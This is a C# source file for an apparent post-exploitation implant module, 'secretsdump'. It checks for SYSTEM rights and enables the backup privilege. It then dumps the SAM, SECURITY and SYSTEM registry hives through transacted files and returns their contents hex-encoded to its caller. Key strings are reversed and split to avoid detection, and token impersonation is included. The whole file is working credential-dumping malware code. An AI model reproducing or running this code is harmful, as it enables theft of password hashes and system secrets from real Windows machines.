using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Diagnostics;


public class Module_secretsdump
{
    public const string SUCC_CODE        = "0";
    public const string ERR_CODE         = "1";
    public const string NON_TOKEN_VALUE  = "0";
    public const string CUSTOM_SEPARATOR = "|";
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private const int KEY_ALL_ACCESS = 0xF003F;
    private const int ERROR_NONE = 0x0;

    public enum ROOT_KEY : uint { HKEY_LOCAL_MACHINE = 0x80000002 }

    [StructLayout(LayoutKind.Sequential)]
    internal struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public int lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExW", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int RegOpenKeyEx(
        ROOT_KEY hKey,
        [MarshalAs(UnmanagedType.LPWStr)] string subKey,
        int options,
        int samDesired,
        ref UIntPtr phkResult);

    [DllImport("ntdll.dll", EntryPoint = "NtSaveKey", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern Int32 NtSaveKey(
        UIntPtr hKey,
        UIntPtr fileHandle);

    [DllImport("ktmw32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    public extern static System.IntPtr CreateTransaction(
        IntPtr lpTransactionAttributes,
        IntPtr UOW,
        int CreateOptions,
        int IsolationLevel,
        int IsolationFlags,
        int Timeout,
        [MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder Description);

    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern UIntPtr CreateFileTransactedW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile,
        IntPtr hTransaction,
        ref ushort pusMiniVersion,
        IntPtr nullValue);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES { public UInt32 PrivilegeCount; public LUID Luid; public UInt32 Attributes; }

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        out TOKEN_PRIVILEGES PreviousState,
        out uint ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid);

    [DllImport("kernel32.dll")]
    static extern bool GetFileSizeEx(
        UIntPtr hFile,
        out long lpFileSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(
        UIntPtr hFile,
        IntPtr lpFileMappingAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        IntPtr dwNumberOfBytesToMap);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        TokenAccessLevels DesiredAccess,
        bool OpenAsSelf,
        out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentThread();

    private string ByteArrayToString(byte[] ba)
    {
        StringBuilder hex = new StringBuilder(ba.Length * 2);
        foreach (byte b in ba)
            hex.AppendFormat("{0:x2}", b);
        return hex.ToString();
    }

    private string ReverseString(string s)
    {
        char[] array = s.ToCharArray();
        Array.Reverse(array);
        return new string(array);
    }

    private bool IsHighIntegrity()
    {
        bool flag = false;
        using(WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(identity);
            flag = principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        return flag;
    }

    private bool IsSYSTEM()
    {
        string username = "";
        using(WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            username = wid.Name;
        }
        
        if (username != ReverseString("ME"+"TSY"+"S\\Y"+"TIR"+"OHTU"+"A TN"))
            return false;
        else
            return true;
    }

    private void EnableDisablePrivilege(IntPtr htok, string PrivilegeName, bool EnableDisable)
    {
        var tkp = new TOKEN_PRIVILEGES { PrivilegeCount = 1 };
        LUID luid;
        if (!LookupPrivilegeValue(null, PrivilegeName, out luid))
        {
            Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
            return;
        }
        tkp.Luid = luid;
        tkp.Attributes = (uint)(EnableDisable ? 2 : 0);
        TOKEN_PRIVILEGES prv;
        uint rb;
        if (!AdjustTokenPrivileges(htok, false, ref tkp, 256, out prv, out rb))
        {
            Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
            return;
        }
    }

    private string getRandomName(Random rand)
    {
        string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        char[] stringChars = new char[8];
        for (int i = 0; i < stringChars.Length; i++)
        {
            stringChars[i] = seedVals[rand.Next(seedVals.Length)];
        }
        return new string(stringChars);
    }

    private string[] doSecretsDump()
    {
        string result = "";

        try
        {
            if (!IsHighIntegrity())
                return new string[]{ERR_CODE, "No High Integrity detected in current context" + Environment.NewLine};
            if (!IsSYSTEM())
                return new string[]{ERR_CODE, "The SYSTEM account is needed in the current context" + Environment.NewLine};

            UIntPtr hKey = UIntPtr.Zero;
            SECURITY_ATTRIBUTES tSecAttrib = new SECURITY_ATTRIBUTES();
            ROOT_KEY rKey = ROOT_KEY.HKEY_LOCAL_MACHINE;

            tSecAttrib.nLength = Marshal.SizeOf(tSecAttrib);
            tSecAttrib.lpSecurityDescriptor = 0;
            tSecAttrib.bInheritHandle = true;
            IntPtr transactionHandle = IntPtr.Zero;
            IntPtr lpTransactionAttributes = IntPtr.Zero;
            IntPtr UOW = IntPtr.Zero;
            int CreateOptions = 0;
            int IsolationLevel = 0;
            int IsolationFlags = 0;
            int Timeout = 0;
            Random rand = new Random();
            StringBuilder Description = new StringBuilder(getRandomName(rand));
            UIntPtr createFileHandle;
            ushort miniVersion = 0xffff;
            long fileSize;
            IntPtr mapping, mapview;

            var currTkn = IntPtr.Zero;
            bool retOt = OpenThreadToken(GetCurrentThread(), TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query, false, out currTkn);
            if (retOt == false)
                throw new Exception("Can not OpenThreadToken");

            EnableDisablePrivilege(currTkn, ReverseString("eg"+"eli"+"vi"+"rP"+"puk"+"caB"+"eS"), true);

            string[] tKeys = {
                ReverseString("M"+"A"+"S"),
                ReverseString("YT"+"IRU"+"CES"),
                ReverseString("ME"+"TSY"+"S")
            };

            foreach (string tKey in tKeys)
            {
                if (RegOpenKeyEx(rKey, tKey, 0, KEY_ALL_ACCESS, ref hKey) == ERROR_NONE)
                {
                    transactionHandle = CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, Description);
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    path = path + string.Format(@"\{0}.log", getRandomName(rand));
                    createFileHandle = CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000001, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);
                    int a = NtSaveKey(hKey, createFileHandle);
                    GetFileSizeEx(createFileHandle, out fileSize);
                    mapping = CreateFileMapping(createFileHandle, IntPtr.Zero, 0x2, 0, 0, "");
                    mapview = MapViewOfFile(mapping, 0x4, 0, 0, IntPtr.Zero);
                    byte[] content = new byte[fileSize];
                    Marshal.Copy(mapview, content, 0, (int)fileSize);
                    result += ByteArrayToString(content) + CUSTOM_SEPARATOR;
                }
            }

            if (result.EndsWith(CUSTOM_SEPARATOR))
                result = result.Substring(0, (result.Length - 1));
        }
        catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        return doSecretsDump();
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_secretsdump m = new Module_secretsdump();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}